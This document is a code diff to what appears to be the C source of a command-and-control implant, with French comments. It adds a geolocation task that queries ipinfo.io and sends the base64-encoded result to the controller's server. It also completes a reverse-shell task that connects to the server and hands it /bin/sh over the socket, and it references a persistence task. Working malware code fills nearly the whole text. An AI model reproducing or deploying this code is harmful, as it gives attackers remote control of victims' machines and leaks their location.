@@ -11,9 +11,33 @@
 #include "tasks.h"
 #include "network.h"
 
+#include <curl/curl.h>
+
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
 // Server information
 extern const char* server_ip;
 extern const int server_port;
+
+static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
+{
+    size_t total_size = size * nmemb;
+    char *buf = (char *)userp;
+    size_t available_space = 4096 - strlen(buf) - 1;  // -1 for null terminator
+
+    if (total_size > available_space) {
+        total_size = available_space;
+    }
+
+    if (available_space > 0) {
+        strncat(buf, (char *)contents, total_size);
+    }
+
+    return size * nmemb;
+}
+
 
 void task_execve(char *command_str, char *argument_str, const char *id_task) {
     
@@ -100,50 +124,84 @@ void task_sleep(char *sleep_time_str, char *jitter_str) {
 
 void task_locate(const char *id_task) {
 
-    char result_buffer[4096] = {0};
-
-    // Get localization info with curl CHANGE LE MODE
-    FILE *fp = popen("curl -s ipinfo.io", "r");
-    if (fp == NULL) {
-        perror("Erreur lors de l'exécution de curl");
-        return;
-    }
-
-    char buffer[1024];
-    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
-        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
-    }
-    pclose(fp);
-
-    // Encode the result
-    char *encoded_result = encode(result_buffer);
-    if (encoded_result == NULL) {
-        printf("Erreur d'encodage en base64\n");
-        printf("Tâche annulée\n");
-        return;
-    }
-
-    // Building the message
-    char message[4096];
-    snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
+        CURL *curl;
+        CURLcode res;
+        char result_buffer[4096] = {0};
     
-    // Send the result to the server
-    char *response = send_server_message(message, server_ip, server_port);
+        curl_global_init(CURL_GLOBAL_DEFAULT);
+        curl = curl_easy_init();
     
-    if (response != NULL) {
-        free(response);
-    } else {
-        printf("Échec de l'envoi du résultat au serveur\n");
-    }
-
-    // Free memory
-    free(encoded_result);
+        if(curl) {
+            curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io");
+            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
+    
+            res = curl_easy_perform(curl);
+            if(res != CURLE_OK) {
+                fprintf(stderr, "Échec de la requête cURL: %s\n", curl_easy_strerror(res));
+                goto cleanup;
+            }
+    
+            // Encode the result
+            char *encoded_result = encode(result_buffer);
+            if (encoded_result == NULL) {
+                fprintf(stderr, "Erreur d'encodage en base64\n");
+                goto cleanup;
+            }
+    
+            // Building the message
+            char message[4096];
+            snprintf(message, sizeof(message), "RESULT,%s,%s,%s", uid, id_task, encoded_result);
+    
+            // Send the result to the server
+            char *response = send_server_message(message, server_ip, server_port);
+    
+            if (response != NULL) {
+                free(response);
+            } else {
+                fprintf(stderr, "Échec de l'envoi du résultat au serveur\n");
+            }
+    
+            free(encoded_result);
+    
+    cleanup:
+            curl_easy_cleanup(curl);
+        }
+        curl_global_cleanup();
 }
 
-void task_revshell() {
+
+
+void task_revshell(int server_port, const char *server_ip) {
     printf("Exécution de la tâche revshell\n");
-    // Implémentation à faire
-    return;
+    const char *ip = (server_ip != NULL) ? server_ip : "127.0.0.1";
+
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(server_port);
+    server.sin_addr.s_addr = inet_addr(ip);
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("Échec de création du socket");
+        return;
+    }
+
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        perror("Échec de la connexion au serveur");
+        close(sock);
+        return;
+    }
+
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+
+    char *args[] = {"/bin/sh", NULL};
+    execve("/bin/sh", args, NULL);
+
+    perror("execve failed");
+    close(sock);
 }
 
 void task_persist() {
